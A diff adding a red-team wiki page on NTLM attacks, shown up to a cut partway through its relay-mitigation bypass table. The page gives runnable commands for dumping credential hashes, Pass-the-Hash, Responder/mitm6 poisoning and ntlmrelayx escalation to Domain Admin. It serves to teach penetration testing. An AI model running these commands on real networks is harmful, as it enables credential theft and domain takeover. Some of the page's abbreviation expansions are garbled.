@@ -1,0 +1,1300 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>NTLM Attacks | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="NTLM Attacks">
+		<meta name="keywords" content="adcs, coercion, dcsync, ntlm, ntlm-relay, pass-the-hash, petitpotam, redteam, responder">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="NTLM Attacks">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="NTLM exploitation, from hash extraction and Pass-the-Hash to relay attacks, coercion, ADCS abuse, and DCSync.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/redteam/ntlm-attacks.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="NTLM Attacks">
+		<meta name="twitter:description" itemprop="description" content="NTLM exploitation, from hash extraction and Pass-the-Hash to relay attacks, coercion, ADCS abuse, and DCSync.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-ntlm-protocol">The NTLM Protocol</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#ntlmv1-vs-ntlmv2">NTLMv1 vs NTLMv2</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#tools-installation-archlinux">Tools Installation (ArchLinux)</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#ntlm-hash-extraction">NTLM Hash Extraction</a></b>
+					<ul>
+						<li><a href="#from-lsass-memory">From LSASS Memory</a></li>
+						<li><a href="#from-the-sam-registry-hive">From the SAM Registry Hive</a></li>
+						<li><a href="#from-ntdsdit-the-domain-database">From NTDS.dit (the Domain Database)</a></li>
+						<li><a href="#hash-format-reference">Hash Format Reference</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#pass-the-hash-pth">Pass-the-Hash (PtH)</a></b>
+					<ul>
+						<li><a href="#why-pth-works-on-some-services">Why PtH Works on Some Services</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#ntlm-relay">NTLM Relay</a></b>
+					<ul>
+						<li><a href="#forcing-authentication">Forcing Authentication</a></li>
+						<li><a href="#name-resolution-poisoning">Name Resolution Poisoning</a></li>
+						<li><a href="#ipv6-poisoning-with-mitm6">IPv6 Poisoning with mitm6</a></li>
+						<li><a href="#ntlmrelayx-the-swiss-army-knife">ntlmrelayx - The Swiss Army Knife</a></li>
+						<li><a href="#relay-to-ldap-deep-dive">Relay to LDAP - Deep Dive</a></li>
+						<li><a href="#relay-target-selection-who-matters">Relay Target Selection - Who Matters</a></li>
+						<li><a href="#relay-mitigations-and-their-bypasses">Relay Mitigations and Their Bypasses</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#capturing-and-cracking-net-ntlm-hashes">Capturing and Cracking Net-NTLM Hashes</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#authentication-coercion">Authentication Coercion</a></b>
+					<ul>
+						<li><a href="#petitpotam">PetitPotam</a></li>
+						<li><a href="#printerbug">PrinterBug</a></li>
+						<li><a href="#dfscoerce">DFSCoerce</a></li>
+						<li><a href="#shadowcoerce">ShadowCoerce</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#adcs-attacks">ADCS Attacks</a></b>
+					<ul>
+						<li><a href="#esc1">ESC1</a></li>
+						<li><a href="#esc1-via-ntlm-relay">ESC1 via NTLM Relay</a></li>
+						<li><a href="#esc2-esc13-quick-reference">ESC2-ESC13 Quick Reference</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#dcsync">DCSync</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#common-mistakes">Common Mistakes</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/redteam/index.html">Redteam</a></li>
+						<li aria-current="page"><a href="/wiki/articles/redteam/ntlm-attacks.html">Ntlm Attacks</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="ntlm-attacks">NTLM Attacks</h2>
+					<p>
+						<abbr title="NT LAN Manager">NTLM</abbr>
+						exploitation, from hash extraction and Pass-the-Hash to relay attacks,
+						coercion, A
+						<abbr title="Domain Controller">DC</abbr>
+						S abuse, and
+						<abbr title="Domain Controller">DC</abbr>
+						Sync.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							<abbr title="NT LAN Manager">NTLM</abbr>
+							proves possession of a password hash without ever sending the hash or
+							the password. That design makes the hash itself a reusable credential and makes the authentication
+							exchange relayable. This article extracts hashes from memory, the registry, and the domain database;
+							reuses them directly with Pass-the-Hash; captures and relays authentication; coerces privileged
+							machines into authenticating; and abuses certificate services and replication to escalate to
+							Domain Admin.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/http.html">/wiki/articles/fundamentals/http.html</a> - <abbr title="Hypertext Transfer Protocol">HTTP</abbr> authentication headers, <abbr title="NT LAN Manager">NTLM</abbr> negotiation in <abbr title="Hypertext Transfer Protocol">HTTP</abbr> ( <abbr title="World Wide Web">WWW</abbr> -Authenticate: Negotiate/ <abbr title="NT LAN Manager">NTLM</abbr> )</li>
+							<li><a href="/wiki/articles/fundamentals/authentication.html">/wiki/articles/fundamentals/authentication.html</a> - <abbr title="NT LAN Manager">NTLM</abbr> challenge-response protocol, session keys, message types</li>
+							<li><a href="/wiki/articles/fundamentals/cryptography.html">/wiki/articles/fundamentals/cryptography.html</a> - MD4, DES, <abbr title="Hash-based Message Authentication Code">HMAC</abbr> -MD5, the building blocks of <abbr title="NT LAN Manager">NTLM</abbr></li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="the-ntlm-protocol">The NTLM Protocol</h3>
+						<p>
+							<abbr title="NT LAN Manager">NTLM</abbr>
+							is a challenge-response authentication protocol that proves possession
+							of a password hash without transmitting the hash or password. It operates over
+							<abbr title="Server Message Block">SMB</abbr>
+							,
+							<abbr title="Hypertext Transfer Protocol">HTTP</abbr>
+							,
+							<abbr title="Maximum Segment Size">MSS</abbr>
+							QL,
+							<abbr title="Lightweight Directory Access Protocol">LDAP</abbr>
+							,
+							<abbr title="Remote Procedure Call">RPC</abbr>
+							,
+							<abbr title="Simple Mail Transfer Protocol">SMTP</abbr>
+							, POP,
+							<abbr title="Internet Message Access Protocol">IMAP</abbr>
+							, and any application that calls SSPI (Security Support Provider Interface).
+						</p>
+						<pre class="plaintext">
+NTLMv2 Authentication Flow:
+
+1. Client -&gt; Server:  Type 1 - Negotiate
+   (Client capabilities, domain name, workstation name)
+
+2. Server -&gt; Client:  Type 2 - Challenge
+   (Server nonce (8 bytes for NTLMv1, variable for NTLMv2),
+    server name, domain name, negotiated flags)
+
+3. Client -&gt; Server:  Type 3 - Authenticate
+   (Username, domain name, NT/LM responses, client nonce,
+    timestamp (NTLMv2), target info, encrypted session key)
+
+NTLMv2 Response = HMAC-MD5(
+    NT-Hash || Upper(Username) || domain,
+    Server-Challenge || Client-Nonce || Timestamp || Target-Info
+)
+
+The NT-Hash = MD4(Unicode(password))
+						</pre>
+						<p>
+							The NT hash (MD4 of the Unicode password) is the foundation of all
+							<abbr title="NT LAN Manager">NTLM</abbr>
+							authentication.
+							It is unsalted, uniterated, and computed once per password. If you have the NT hash, you never
+							need the plaintext password for
+							<abbr title="NT LAN Manager">NTLM</abbr>
+							-based authentication - this is
+							<b>Pass-the-Hash</b>
+							.
+						</p>
+					</section>
+					<section>
+						<h3 id="ntlmv1-vs-ntlmv2">NTLMv1 vs NTLMv2</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Property</th>
+									<th align="center">NTLMv1</th>
+									<th align="center">NTLMv2</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">Hash function</td>
+									<td align="center">DES (with LM/NT hash)</td>
+									<td align="center">HMAC-MD5</td>
+								</tr>
+								<tr>
+									<td align="center">Client nonce</td>
+									<td align="center">8 bytes (static)</td>
+									<td align="center">8 bytes (per-request)</td>
+								</tr>
+								<tr>
+									<td align="center">Timestamp</td>
+									<td align="center">No</td>
+									<td align="center">Yes (mitigates replay)</td>
+								</tr>
+								<tr>
+									<td align="center">Target info</td>
+									<td align="center">No</td>
+									<td align="center">Server name, domain, DNS info</td>
+								</tr>
+								<tr>
+									<td align="center">Server challenge</td>
+									<td align="center">8 bytes</td>
+									<td align="center">8 bytes</td>
+								</tr>
+								<tr>
+									<td align="center">Cracking feasibility</td>
+									<td align="center">Trivial -> DES key space is 2^56</td>
+									<td align="center">Crackable with GPU (hashcat -m 5600)</td>
+								</tr>
+								<tr>
+									<td align="center">Enabled by default</td>
+									<td align="center">Disabled since Windows 2008 R2</td>
+									<td align="center">Enabled</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							<abbr title="NT LAN Manager">NTLM</abbr>
+							v1 is trivially crackable because the LM/
+							<abbr title="NT LAN Manager">NTLM</abbr>
+							v1 response
+							halves are 8 bytes each, encrypted with single DES (56-bit key), and the DES key is derived
+							from the first 7 bytes of the LM/NT hash. With a fixed client nonce and no timestamp, a single
+							rainbow table or
+							<abbr title="Graphical Processing Unit">GPU</abbr>
+							crack (hashcat -m 5500) recovers most passwords
+							in minutes.
+						</p>
+					</section>
+					<section>
+						<h3 id="tools-installation-archlinux">Tools Installation (ArchLinux)</h3>
+						<pre class="bash">
+sudo pacman -S python-impacket openldap hashcat samba
+yay -S netexec         # crackmapexec successor (provides netexec, cme)
+# or: sudo pacman -S crackmapexec
+
+# Responder - captures Net-NTLM hashes from LLMNR/mDNS/NBT-NS
+# Installed with Impacket or standalone
+pip install responder   # or: git clone /opt/Responder
+						</pre>
+					</section>
+					<section>
+						<h3 id="ntlm-hash-extraction">NTLM Hash Extraction</h3>
+						<p>
+							The NT hash is stored in the SAM registry hive (local accounts), the NTDS.dit database (domain
+							accounts), or in memory (
+							<abbr title="Local Security Authority Subsystem Service">LSASS</abbr>
+							process). Each
+							source requires a different extraction technique.
+						</p>
+						<h4 id="from-lsass-memory">From LSASS Memory</h4>
+						<pre class="bash">
+# On a compromised Windows host (requires local admin/SYSTEM):
+# Method 1 - mimikatz (on the target)
+# mimikatz # privilege::debug
+# mimikatz # sekurlsa::logonpasswords
+# Output includes: User, Domain, LM hash, NT hash, SHA1, DPAPI keys
+# NT hash is the field after the second colon (LM:NT)
+
+# Method 2 - Dump LSASS process memory and extract offline
+# On the target (Windows, admin):
+# Find LSASS PID:
+tasklist | findstr lsass
+# Create a minidump:
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump &lt;LSASS_PID&gt; C:\dump\lsass.dmp full
+# Transfer lsass.dmp to your Linux box
+
+# Extract credentials from the dump with pypykatz:
+pip install pypykatz
+pypykatz lsa minidump lsass.dmp
+
+# pypykatz extracts:
+#   - Logon sessions (users, domains, NT hashes, SHA1 hashes)
+#   - Kerberos keys (AES128/AES256, DES)
+#   - DPAPI master keys
+#   - Credential Manager entries (RDP passwords, saved web passwords)
+#   - MSTSC (RDP client) connection strings
+						</pre>
+						<pre class="bash">
+# Method 3 - nanodump (stealthier, operates via LSASS process hollowing)
+# On the target (Windows): nanodump.exe --write C:\dump\lsass.dmp
+# Transfer the dump. Extract same as above with pypykatz.
+						</pre>
+						<h4 id="from-the-sam-registry-hive">From the SAM Registry Hive</h4>
+						<pre class="bash">
+# On a compromised Windows host (requires SYSTEM):
+# Method 1 - Dump SAM and SYSTEM hives from the registry
+reg save HKLM\SAM C:\dump\sam.save
+reg save HKLM\SYSTEM C:\dump\system.save
+# Transfer both files to attacker machine
+
+# Extract hashes with secretsdump.py
+secretsdump.py -sam sam.save -system system.save LOCAL
+
+# Method 2 - Direct extraction via secretsdump on the live system
+secretsdump.py corp.local/jsmith:password@TARGET-PC.corp.local
+# Extracts SAM hashes (local accounts) and cached domain logon hashes
+# (mscash / DCC2 - hashcat mode 2100)
+						</pre>
+						<h4 id="from-ntdsdit-the-domain-database">From NTDS.dit (the Domain Database)</h4>
+						<pre class="bash">
+# Requires Domain Admin or equivalent on a Domain Controller
+# Method 1 - secretsdump.py with credentials
+secretsdump.py -just-dc corp.local/administrator:password@dc01.corp.local
+
+# Method 1b - Dump only specific users (quieter, faster)
+secretsdump.py -just-dc-user administrator corp.local/administrator:password@dc01.corp.local
+secretsdump.py -just-dc-user krbtgt corp.local/administrator:password@dc01.corp.local
+
+# Method 2 - Dump via DCSync (requires Replicating Directory Changes rights)
+# This approach mimics a DC replication request and does not touch the DC&#39;s filesystem
+secretsdump.py -just-dc-user administrator &#39;corp.local/user_with_dcsync_rights:password&#39;@dc01.corp.local
+
+# Method 3 - Volume Shadow Copy (on the DC itself)
+# vssadmin create shadow /for=C:
+# copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\dump\ntds.dit
+# reg save HKLM\SYSTEM C:\dump\system.save
+# Then offline extraction:
+secretsdump.py -ntds ntds.dit -system system.save LOCAL
+
+# Method 4 - Invoke-NinjaCopy (PowerShell, bypasses file locks on NTDS.dit)
+# Utilizes the volume shadow copy mechanism silently
+						</pre>
+						<h4 id="hash-format-reference">Hash Format Reference</h4>
+						<pre class="plaintext">
+secretsdump.py output format:
+username:RID:LM_HASH:NT_HASH:::
+
+Examples:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+  ^^^^^^^^^^^^^ ^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  username      RID  LM hash (empty = aad3b4...)        NT hash
+
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+
+Machine account:
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:ae8ae67a3bf14c9f4e81e0a74b0b0c5a:::
+
+Format for Pass-the-Hash tools:
+  LM_HASH:NT_HASH
+  :NT_HASH         (when LM is empty - always the case on 2008+)
+						</pre>
+					</section>
+					<section>
+						<h3 id="pass-the-hash-pth">Pass-the-Hash (PtH)</h3>
+						<p>
+							Pass-the-Hash uses the NT hash directly in the
+							<abbr title="NT LAN Manager">NTLM</abbr>
+							authentication handshake
+							without knowing the plaintext password. The NT hash IS the precomputed response to the server
+							challenge - the authentication process only needs the hash to compute the
+							<abbr title="NT LAN Manager">NTLM</abbr>
+							v2 response.
+						</p>
+						<p>
+							<b>Services that accept NTLM authentication over the network</b>
+							(and therefore accept PtH):
+						</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Service</th>
+									<th align="center">Port</th>
+									<th align="center">Tool</th>
+									<th align="center">Notes</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">SMB</td>
+									<td align="center">TCP 445</td>
+									<td align="center"><code>psexec.py</code>,<code>smbexec.py</code>,<code>crackmapexec</code>,<code>wmiexec.py</code></td>
+									<td align="center">Most reliable. Administrative shares required for PsExec-style code execution.</td>
+								</tr>
+								<tr>
+									<td align="center">WMI</td>
+									<td align="center">TCP 135 + dynamic</td>
+									<td align="center"><code>wmiexec.py</code>,<code>crackmapexec</code></td>
+									<td align="center">DCOM-based. No service creation, no disk artifacts. Quieter than PsExec.</td>
+								</tr>
+								<tr>
+									<td align="center">WinRM</td>
+									<td align="center">TCP 5985/5986</td>
+									<td align="center"><code>evil-winrm</code></td>
+									<td align="center">PowerShell Remoting. Requires the user to be in<code>Remote Management Users</code>or local Administrators.</td>
+								</tr>
+								<tr>
+									<td align="center">RDP</td>
+									<td align="center">TCP 3389</td>
+									<td align="center"><code>xfreerdp /pth</code></td>
+									<td align="center">Requires Restricted Admin mode enabled (DisableRestrictedAdmin=0).</td>
+								</tr>
+								<tr>
+									<td align="center">MSSQL</td>
+									<td align="center">TCP 1433</td>
+									<td align="center"><code>mssqlclient.py</code></td>
+									<td align="center">Requires the user to be a SQL login or mapped Windows login.</td>
+								</tr>
+								<tr>
+									<td align="center">SSH</td>
+									<td align="center">TCP 22</td>
+									<td align="center">Built-in if AD-integrated SSH</td>
+									<td align="center">Rare. Requires OpenSSH configured with SSPI authentication.</td>
+								</tr>
+							</tbody>
+						</table>
+						<pre class="bash">
+# PtH with crackmapexec (SMB)
+crackmapexec smb 10.0.0.50 -u jsmith -H :ntlm_hash -d corp.local
+
+# PtH with crackmapexec (WinRM)
+crackmapexec winrm 10.0.0.50 -u jsmith -H :ntlm_hash -d corp.local
+
+# PtH with crackmapexec (MSSQL)
+crackmapexec mssql 10.0.0.50 -u sa -H :ntlm_hash
+
+# PtH - interactive shell via PsExec
+psexec.py -hashes :ntlm_hash corp.local/jsmith@10.0.0.50
+
+# PtH - interactive shell via WMI (no service, no disk, quieter)
+wmiexec.py -hashes :ntlm_hash corp.local/jsmith@10.0.0.50
+
+# PtH - interactive shell via SMBExec (executes via SMB named pipe)
+smbexec.py -hashes :ntlm_hash corp.local/jsmith@10.0.0.50
+
+# PtH - execute a single command (AT scheduled task)
+atexec.py -hashes :ntlm_hash corp.local/jsmith@10.0.0.50 &#39;whoami /all&#39;
+
+# PtH - execute via DCOM
+dcomexec.py -hashes :ntlm_hash corp.local/jsmith@10.0.0.50
+
+# PtH - dump SAM from target
+secretsdump.py -hashes :ntlm_hash corp.local/jsmith@10.0.0.50
+						</pre>
+						<pre class="bash">
+# PtH with evil-winrm (WinRM / PowerShell Remoting)
+evil-winrm -i 10.0.0.50 -u jsmith -H ntlm_hash
+
+# PtH with xfreerdp (RDP - Restricted Admin mode required)
+xfreerdp /v:10.0.0.50 /u:jsmith /pth:ntlm_hash
+# If Restricted Admin is disabled, this will fail with &#34;account restrictions are preventing&#34;
+
+# Check if Restricted Admin is enabled via crackmapexec
+crackmapexec smb 10.0.0.50 -u jsmith -H :ntlm_hash -d corp.local -M rdp
+# Or via registry query: HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin = 0
+						</pre>
+						<pre class="bash">
+# PtH - bulk execution: test a hash against a subnet
+crackmapexec smb 10.0.0.0/24 -u administrator -H :ntlm_hash --local-auth
+
+# --local-auth: use the local SAM (.\Administrator), not the domain
+# Remove --local-auth for domain authentication
+						</pre>
+						<h4 id="why-pth-works-on-some-services">Why PtH Works on Some Services</h4>
+						<p>
+							PtH works because the
+							<abbr title="NT LAN Manager">NTLM</abbr>
+							challenge-response protocol uses the hash as the
+							input to the response computation. It does not require the plaintext password at any point.
+						</p>
+						<p>PtH fails in these cases:</p>
+						<ol>
+							<li><b>Kerberos is enforced</b> - The service requires a Kerberos ticket, not <abbr title="NT LAN Manager">NTLM</abbr> . Request a TGT from the hash first (Overpass-the-Hash).</li>
+							<li><b>Restricted Admin mode for [RDP]{Remote Desktop Protocol} is disabled</b> - Without Restricted Admin, <abbr title="Remote Desktop Protocol">RDP</abbr> requires the plaintext password for the interactive logon process.</li>
+							<li><b>Credential Guard is enabled</b> - Credential Guard isolates <abbr title="Local Security Authority Subsystem Service">LSASS</abbr> in a Hyper-V <abbr title="Virtual Machine">VM</abbr> . The NT hash is never exposed in user-accessible memory, so only Kerberos tickets can be extracted.</li>
+						</ol>
+						<p>
+							<abbr title="Server Message Block">SMB</abbr>
+							signing does not stop PtH (the client derives the session key from
+							the hash), but it does stop
+							<abbr title="NT LAN Manager">NTLM</abbr>
+							relay, because the relayed session never
+							holds the key.
+						</p>
+					</section>
+					<section>
+						<h3 id="ntlm-relay">NTLM Relay</h3>
+						<p>
+							<abbr title="NT LAN Manager">NTLM</abbr>
+							relay intercepts a client's challenge-response authentication and forwards
+							it to another service that the client's account has access to. The victim authenticates to you;
+							you relay that authentication to the target service. You never crack a hash - you weaponize
+							the authentication in transit.
+						</p>
+						<pre class="plaintext">
+NTLM Relay Attack Flow:
+
+Victim Client            Attacker (Relay)           Target Server
+     |                          |                         |
+     |--- Type 1 (Negotiate) --&gt;|                         |
+     |                          |--- Type 1 (Negotiate) -&gt;|
+     |                          |&lt;-- Type 2 (Challenge) --|
+     |&lt;-- Type 2 (Challenge) ---|                         |
+     |--- Type 3 (Response) ---&gt;|                         |
+     |                          |--- Type 3 (Response) --&gt;|
+     |                          |&lt;-- Authenticated --------|
+						</pre>
+						<p>
+							The attacker sits in the middle, forwarding the challenge from the target server to the victim
+							client, and forwarding the victim's response back to the target server. The attacker never learns
+							the hash or password - they simply relay the session.
+						</p>
+						<h4 id="forcing-authentication">Forcing Authentication</h4>
+						<p>
+							Before you can relay, a victim must authenticate to your machine. You either poison name resolution
+							requests or coerce a machine into authenticating.
+						</p>
+						<h4 id="name-resolution-poisoning">Name Resolution Poisoning</h4>
+						<pre class="bash">
+# Responder listens on the local network and poisons name resolution queries.
+# When any Windows host tries to resolve a nonexistent hostname (typo, stale
+# mapping, DNS failure), LLMNR, NBT-NS, and mDNS broadcasts are sent.
+# Responder answers those broadcasts, claiming to be the requested host,
+# and captures the victim&#39;s Net-NTLM hash.
+
+# Launch Responder on the attacker&#39;s interface
+sudo responder -I eth0 -v
+
+# What Responder captures:
+#   - NTLMv2 hashes from SMB, HTTP, LDAP, MSSQL, FTP poison responses
+#   - Cleartext credentials from HTTP POST (if the victim sends basic auth)
+#   - WPAD.dat (Web Proxy Auto-Discovery) requests -&gt; can serve a malicious PAC file
+#   - Print requests (MS-RPRN server)
+						</pre>
+						<pre class="bash">
+# For combined relay + poisoning attacks, DISABLE SMB and HTTP servers in Responder
+# (otherwise Responder captures the hash instead of letting ntlmrelayx relay it)
+sudo vi /etc/responder/Responder.conf
+# Set:
+#   SMB = Off
+#   HTTP = Off
+# Then launch ntlmrelayx separately for relaying.
+						</pre>
+						<pre class="bash">
+# WPAD poisoning - Responder answers WPAD name resolution queries, and when
+# the victim fetches http://wpad/wpad.dat, Responder serves a malicious PAC
+# that proxies web traffic through your machine OR captures Net-NTLM via
+# HTTP 401 WWW-Authenticate: NTLM
+sudo responder -I eth0 -w On
+# -w : Start the WPAD rogue proxy server
+						</pre>
+						<h4 id="ipv6-poisoning-with-mitm6">IPv6 Poisoning with mitm6</h4>
+						<pre class="bash">
+# mitm6 takes over IPv6 configuration on the local network.
+# Windows prefers IPv6 over IPv4 when both are available. mitm6 answers
+# DHCPv6 requests and becomes the IPv6 DNS server for all victims -
+# redirecting their WPAD queries to your machine.
+pip install mitm6
+sudo mitm6 -i eth0 -d corp.local
+
+# mitm6 + ntlmrelayx combination:
+#   mitm6 pushes a WPAD config -&gt; victims use your HTTP proxy -&gt;
+#   HTTP proxy requests NTLM auth -&gt; relay to LDAP/SMB/HTTP/ADCS
+						</pre>
+						<h4 id="ntlmrelayx-the-swiss-army-knife">ntlmrelayx - The Swiss Army Knife</h4>
+						<pre class="bash">
+# Basic NTLM relay - relay captured hashes to SMB on a target
+ntlmrelayx.py -t smb://10.0.0.50 -smb2support
+
+# -t : relay target (where to forward the authentication)
+# -smb2support : enable SMBv2 protocol support
+# If authentication succeeds against 10.0.0.50, ntlmrelayx dumps the SAM hashes.
+
+# Relay to SMB and execute a command on successful auth
+ntlmrelayx.py -t smb://10.0.0.50 -smb2support -c &#39;powershell -enc &lt;BASE64&gt;&#39;
+
+# Relay to LDAP - dump domain information
+ntlmrelayx.py -t ldap://10.0.0.1
+
+# Relay to LDAP on the DC - add a computer account to the domain
+ntlmrelayx.py -t ldaps://10.0.0.1 --add-computer EVIL-MACHINE
+
+# Relay to LDAP - delegate access (RBCD: Resource-Based Constrained Delegation)
+ntlmrelayx.py -t ldaps://10.0.0.1 --delegate-access
+
+# Relay to LDAP - add a user to a group (e.g., Domain Admins)
+ntlmrelayx.py -t ldaps://10.0.0.1 --escalate-user EVIL-MACHINE\$
+
+# Relay to LDAP - set shadow credentials (certificate-based auth via Key Trust)
+ntlmrelayx.py -t ldaps://10.0.0.1 --shadow-credentials --shadow-target TARGET-USER
+
+# Relay to ADCS HTTP endpoint - request a certificate
+ntlmrelayx.py -t http://10.0.0.1/certsrv/certfnsh.asp --adcs
+						</pre>
+						<pre class="bash">
+# Relay to MSSQL
+ntlmrelayx.py -t mssql://10.0.0.50 -q &#39;EXEC xp_cmdshell &#34;whoami&#34;&#39;
+
+# Relay to IMAP
+ntlmrelayx.py -t imap://10.0.0.50 -q &#39;list &#34;&#34; &#34;*&#34;&#39;
+
+# Multi-target relay - relay to a list of targets
+ntlmrelayx.py -tf targets.txt -smb2support
+# targets.txt format: smb://10.0.0.50
+#                     smb://10.0.0.51
+#                     ldaps://10.0.0.1
+						</pre>
+						<h4 id="relay-to-ldap-deep-dive">Relay to LDAP - Deep Dive</h4>
+						<p>
+							<abbr title="Lightweight Directory Access Protocol">LDAP</abbr>
+							relay is the most powerful relay target. It does
+							not require the relayed user to be a local admin on any machine - only to have Write permissions
+							in
+							<abbr title="Lightweight Directory Access Protocol">LDAP</abbr>
+							over a useful object.
+						</p>
+						<pre class="bash">
+# Relay a Domain Admin&#39;s authentication to LDAP on the DC.
+# LDAP signing and channel binding are not enforced by default on most
+# domains. When LDAP signing is required, relay to LDAP fails; when channel
+# binding (EPA) is required, relay to LDAPS fails as well. Check the
+# directory&#39;s policy before assuming either target is open.
+ntlmrelayx.py -t ldaps://10.0.0.1 --add-computer EVIL-MACHINE
+# Adds computer object EVIL-MACHINE$ to the domain.
+
+ntlmrelayx.py -t ldaps://10.0.0.1 --escalate-user EVIL-MACHINE\$
+# Adds EVIL-MACHINE$ to Domain Admins (requires the relayed user to have
+# AddMember on the Domain Admins group - typically only Domain Admins themselves).
+						</pre>
+						<h4 id="relay-target-selection-who-matters">Relay Target Selection - Who Matters</h4>
+						<p>
+							The relay is only useful if the relayed account has administrative privileges on the target.
+							Common scenarios:
+						</p>
+						<pre class="bash">
+# Relay a Domain Admin&#39;s Net-NTLM to SMB on a workstation -&gt; SAM dump
+# Relay a Domain Admin&#39;s Net-NTLM to LDAPS -&gt; add computer, escalate users
+# Relay a machine account (DC$) to LDAPS -&gt; add users, delegate access
+# Relay ANY privileged account to ADCS -&gt; request certificate -&gt; PKINIT authentication
+						</pre>
+						<h4 id="relay-mitigations-and-their-bypasses">Relay Mitigations and Their Bypasses</h4>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Mitigation</th>
+									<th align="center">How It Blocks</th>
+									<th align="center">Bypass</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><b>SMB Signing</b></td>
+									<td align="center">Prevents relay to SMB (server signs all messages; relay cannot sign because it lacks the shared session key)</td>
+									<td align="center">Use relay to LDAP/LDAPS or HTTP/ADCS instead. SMB signing is required on DCs by default since 2019.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>LDAP Signing</b></td>
+									<td align="center">Prevents relay to LDAP (same mechanism as SMB signing)</td>
+									<td align="center">Use relay to LDAPS (TLS-encrypted LDAP). LDAP channel binding (CBT) still applies.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>LDAP Channel Binding (CBT)</b></td>
+									<td align="center">Binds the LDAP session to the TLS channel -> if relayed, the underlying TLS channel differs</td>
+									<td align="center">Relay to a service that does NOT enforce channel binding (ADCS web enrollment does not).</td>
+								</tr>
+								<tr>
+									<td align="center"><b>EPA (Extended Protection for Authentication)</b></td>
+									<td align="center">Binds the authentication to the TLS channel (same as CBT for HTTP)</td>
+									<td align="center">Relay to services without EPA support (non-IIS servers, legacy apps).</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Microsof's 2019 patch (CVE-2019-1040)</b></td>
+									<td align="center">Removes the Message Integrity Code (MIC) bypass -> patches a flaw that allowed stripping the MIC from NTLM messages</td>
+									<td align="center">Use Drop-the-MIC (if unpatched), or target patched systems differently.</td>
+								</tr>
